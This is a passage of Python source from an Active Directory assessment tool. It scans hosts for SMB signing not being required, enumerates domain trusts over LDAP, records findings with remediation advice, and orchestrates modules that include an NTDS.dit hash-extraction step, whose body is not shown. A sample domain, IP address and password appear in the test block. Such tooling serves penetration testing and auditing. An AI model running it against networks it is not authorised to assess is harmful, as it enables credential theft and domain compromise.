                        status["vulnerable"] = True
                        checked_hosts += 1
                        return status
                        
                except Exception as e:
                    logger.info(f"Anonymous SMB connection to {host} failed: {str(e)}")
                    status["error"] = f"Anonymous check error: {str(e)}"
                    
                # If we have credentials, try again with auth
                if hasattr(self, 'username') and hasattr(self, 'password') and self.username and self.password:
                    try:
                        status["auth_tried"] = True
                        username = self.username
                        domain= self.domain_name
                        if '@' in username:
                            username, domain_part = username.split('@', 1)
                            domain = domain or domain_part
                        elif '\\' in username:
                            domain_part, username = username.split('\\', 1)
                        domain = domain or domain_part
                        domain = self.domain_name or (self.username.split('\\')[0] if '\\' in self.username else '')
                        
                        logger.info(f"Attempting authenticated SMB connection to {host} with user {username}")
                        conn = SMBConnection(host, host, timeout=5)
                        conn.login(username, self.password, domain)
                        
                        # Check if signing is required
                        signing_required = conn.getDialect() != SMB_DIALECT and conn.isSigningRequired()
                        status["signing_required"] = signing_required
                        
                        # Log dialect information
                        logger.info(f"Host {host} - SMB dialect: {conn.getDialect()}, Signing required: {signing_required}")
                        
                        # Close the connection
                        conn.close()
                        
                        if not signing_required:
                            logger.warning(f"Host {host} does not require SMB signing (authenticated check)")
                            status["vulnerable"] = True
                        else:
                            logger.info(f"Host {host} requires SMB signing (authenticated check)")
                            
                    except Exception as e:
                        logger.warning(f"Error checking SMB signing on {host} with auth: {str(e)}")
                        if "auth_failed" in str(e).lower() or "authentication" in str(e).lower():
                            status["error"] = f"Authentication failed: {str(e)}"
                        else:
                            status["error"] = f"Auth check error: {str(e)}"
                
                checked_hosts += 1
                return status
                
            except Exception as e:
                logger.warning(f"Error checking SMB signing on {host}: {str(e)}")
                status["error"] = f"General error: {str(e)}"
                checked_hosts += 1
                return status
        
        # Track all results for diagnostics
        all_results = []
        
        # Check hosts in parallel with a reasonable thread pool
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            future_to_host = {executor.submit(check_host_signing, host): host for host in hosts_to_scan}
            
            for future in concurrent.futures.as_completed(future_to_host):
                host = future_to_host[future]
                try:
                    result = future.result()
                    all_results.append(result)
                    if result and result["vulnerable"]:  # If the host is vulnerable
                        vulnerable_hosts.append(result["host"])
                except Exception as e:
                    logger.error(f"Error checking SMB signing on {host}: {e}")
                    all_results.append({"host": host, "error": str(e), "vulnerable": False})
        
        # Log detailed results for diagnostics
        logger.info(f"Checked {checked_hosts}/{len(hosts_to_scan)} hosts for SMB signing")
        for result in all_results:
            host = result.get("host", "unknown")
            if result.get("vulnerable", False):
                logger.info(f"Host {host} does not require SMB signing - VULNERABLE")
            elif result.get("signing_required") is True:
                logger.info(f"Host {host} requires SMB signing - SECURE")
            elif result.get("error"):
                logger.info(f"Host {host} check error: {result.get('error')}")
            else:
                logger.info(f"Host {host} status unclear")
        
        return vulnerable_hosts

    def _add_info_finding(self, title, description, remediation=None):
        """Add an informational finding to the results."""
        # First check if we need to create the info list
        if "info" not in self.results:
            self.results["info"] = []
        
        # Check if vulnerabilities list exists, if not, create it    
        if "vulnerabilities" not in self.results:
            self.results["vulnerabilities"] = []
            
        # Create the finding
        finding = {
            "title": title,
            "severity": "Info",
            "affected_objects": [],
            "description": description,
            "remediation": remediation if remediation else "No remediation required.",
            "remediation_steps": [],
            "references": [],
            "type": "Information",
            "impact": "No direct security impact."
        }
            
        # Add to info list
        self.results["info"].append({
            "title": title,
            "description": description,
            "remediation": remediation if remediation else "No remediation required."
        })

    def enumerate_domain_trusts(self):
        """Enumerate domain trusts."""
        if not self.conn or not self.conn.bound:
            logger.error("Cannot enumerate trusts: Not connected.")
            self.results["error"] = "LDAP not connected."
            return False
        logger.info("Enumerating domain trusts")
        self.results["findings"]["domain_trusts"] = []
        search_filter = "(objectClass=trustedDomain)"
        attributes = ["flatName", "trustDirection", "trustType", "trustAttributes"]
        try:
            entry_generator = self.conn.extend.standard.paged_search(
                search_base=self.domain_dn, search_filter=search_filter, search_scope=ldap3.SUBTREE,
                attributes=attributes, paged_size=50, generator=True)
            trusts_found = 0
            for entry in entry_generator:
                if 'dn' not in entry or 'attributes' not in entry:
                    continue
                attrs = entry['attributes']
                def get_attr(k):
                    v = attrs.get(k)
                    return v[0] if isinstance(v, list) and v else (v if not isinstance(v, list) else None)

                name = get_attr('flatName')
                if name:
                    trust = {"name": name, "direction": get_attr('trustDirection'), "type": get_attr('trustType')}
                    self.results["findings"]["domain_trusts"].append(trust)
                    trusts_found += 1

            if trusts_found > 0:
                self._add_vuln_finding(
                    "Domain Trusts Enumerated", "Info",
                    [f"{t['name']} (Dir: {t.get('direction', 'N/A')}, Type: {t.get('type', 'N/A')})" for t in self.results["findings"]["domain_trusts"]],
                    f"Found {trusts_found} domain trusts.",
                    "Review trusts, apply SID Filtering.",
                    ["Review trusts.", "Validate necessity.", "Consider direction/transitivity.", "Implement SID Filtering.",
                     "Audit regularly.", "Monitor auth events."],
                    [{"title": "MS Docs Trusts", "url": "https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770901(v=ws.10)"},
                     {"title": "ADSecurity Trusts", "url": "https://adsecurity.org/?p=1670"}]
                )
            logger.info(f"Found {trusts_found} domain trusts")
            return True
        except ldap3.core.exceptions.LDAPException as e:
            logger.error(f"Trust enum LDAP error: {e}")
            self.results["error"] = f"Trust enum failed: {e}"
            return False
        except Exception as e:
            logger.error(f"Trust enum processing error: {e}\n{traceback.format_exc()}")
            self.results["error"] = f"Trust enum error: {e}"
            return False

    # --- Helper to add vulnerability findings consistently ---
    def _add_vuln_finding(self, title, severity, affected_objects, description, remediation, remediation_steps, references, finding_type="Vulnerability"):
        """Add a vulnerability or misconfiguration finding to results."""
        finding = {
            "type": finding_type,
            "severity": severity,
            "title": title,
            "description": description,
            "finding_type": finding_type,
            "affected_objects": affected_objects,
            "remediation": remediation,
            "remediation_steps": remediation_steps,
            "references": references
        }
        self.results.setdefault("vulnerabilities", []).append(finding)
        logger.info(f"Added {finding_type}: {title} (Severity: {severity})")

    def run_enumeration(self):
        """Run all selected enumeration tasks sequentially."""
        logger.info(f"Starting AD enumeration for {self.domain_name}")
        self.results["status"] = "running"
        if 'ntds_extraction' not in self.selected_modules:
            self.results["findings"]["ntds_hashes"] = []
            
        # Define all possible steps mapped to their methods
        all_steps = {
            "Connectivity Check": self.check_host_connectivity,
            "LDAP Authentication": self.connect,
            "User Enumeration": self.enumerate_users,
            "Group Enumeration": self.enumerate_groups,
            "Computer Enumeration": self.enumerate_computers,
            "SMB Signing Check": self.check_smb_signing,
            "Domain Trust Enumeration": self.enumerate_domain_trusts,
            "Password Policy Enumeration": self.enumerate_password_policy,
            "NTDS.dit Extraction": self.extract_ntds_dit,  # Include NTDS method
        }

        # Determine which steps to run based on selected_modules
        # Always run connectivity and auth if possible
        steps_to_run = [("Connectivity Check", all_steps["Connectivity Check"]),
                        ("LDAP Authentication", all_steps["LDAP Authentication"])]

        if 'enumeration' in self.selected_modules:
            # Add all standard enumeration steps if 'enumeration' is selected
            steps_to_run.extend([
                ("User Enumeration", all_steps["User Enumeration"]),
                ("Group Enumeration", all_steps["Group Enumeration"]),
                ("Computer Enumeration", all_steps["Computer Enumeration"]),
                ("SMB Signing Check", all_steps["SMB Signing Check"]),
                ("Domain Trust Enumeration", all_steps["Domain Trust Enumeration"]),
                ("Password Policy Enumeration", all_steps["Password Policy Enumeration"]),
            ])
        # Add specific attack module steps if they are selected
        if 'ntds_extraction' in self.selected_modules:
            # Ensure NTDS step isn't duplicated if 'enumeration' was also selected (it shouldn't be)
            if ("NTDS.dit Extraction", all_steps["NTDS.dit Extraction"]) not in steps_to_run:
                steps_to_run.append(("NTDS.dit Extraction", all_steps["NTDS.dit Extraction"]))
        # Add other module checks here (e.g., kerberoasting, asrep_roasting)

        first_error = None  # Store the first error encountered
        for step_name, task_func in steps_to_run:
            logger.info(f"Running step: {step_name}")
            try:
                success = task_func()
                if not success:
                    logger.error(f"Step '{step_name}' failed explicitly.")
                    # Store the first error message from results if available
                    if first_error is None:
                        first_error = self.results.get("error", f"Step '{step_name}' failed.")
                    # Continue to next step to allow partial results
            except Exception as e:
                logger.error(f"Unexpected exception during step '{step_name}': {str(e)}\n{traceback.format_exc()}")
                if first_error is None:
                    first_error = f"Unexpected error during '{step_name}': {str(e)}"
                # Continue to next step after unexpected error as well

        # Final status update based on whether *any* error occurred
        if first_error:
            self.results["status"] = "error"
            self.results["error"] = first_error  # Report the first error encountered
            logger.error(f"AD enumeration finished with errors. First error: {first_error}")
        else:
            self.results["status"] = "success"
            self.results["error"] = None  # Ensure error is None on success
            logger.info("AD enumeration completed successfully")

        return self.results

# --- Function outside the class ---
# This is kept for potential standalone use or simple invocation,
# but the Flask app uses the class methods directly or via the run_enumeration method.
def run_enumeration_standalone(domain_name, dc_ip, username=None, password=None, modules=None):
    """Run AD enumeration and return results. (Standalone version)"""
    enumerator = ADEnumerator(domain_name, dc_ip, username, password, selected_modules=modules or ['enumeration'])  # Default to basic enum
    return enumerator.run_enumeration()

if __name__ == "__main__":
    # Example usage for standalone testing
    # Replace with your actual test details
    test_domain = "zayd.com"  # Example
    test_dc = "192.168.30.168"  # Example
    test_user = "Zay@Zayd.com"  # Example UPN
    test_pwd = "Password1"  # Example password

    print(f"--- Running STANDALONE authenticated enumeration for {test_domain} ---")
    # Select modules to test, e.g., basic enum + ntds dump
    # test_modules = ['enumeration', 'ntds_extraction']
    test_modules = ['enumeration']  # Just run basic enumeration

    results = run_enumeration_standalone(test_domain, test_dc, test_user, test_pwd, modules=test_modules)

    print("-" * 30)
    print(f"Final Status: {results.get('status')}")
    if results.get('error'):
        print(f"Final Error: {results.get('error')}")
    print("-" * 30)
    print(f"Users Found: {results['findings'].get('users_count', 0)}")
    print(f"Groups Found: {results['findings'].get('groups_count', 0)}")
    print(f"Computers Found: {results['findings'].get('computers_count', 0)}")
    print(f"Trusts Found: {len(results['findings'].get('domain_trusts', []))}")
    print(f"SMB Signing Not Required Hosts: {len(results['findings'].get('smb_signing_disabled', []))}")
    print(f"Kerberoastable Users: {len(results['findings'].get('kerberoastable', []))}")
    print(f"AS-REP Roastable Users: {len(results['findings'].get('asrep_roastable', []))}")
    if results['findings'].get('password_policy'):
        print(f"Password Policy Issues: {len(results['findings']['password_policy'].get('issues', []))}")
    if results['findings'].get('ntds_hashes'):
        print(f"NTDS Hashes Extracted: {len(results['findings']['ntds_hashes'])}")
    print(f"Total Vulnerability/Finding Objects: {len(results.get('vulnerabilities', []))}")
    print("-" * 30)

    # Optional: Print full results JSON
    # import json
    # print(json.dumps(results, indent=2, default=str))  # Use default=str for datetime objects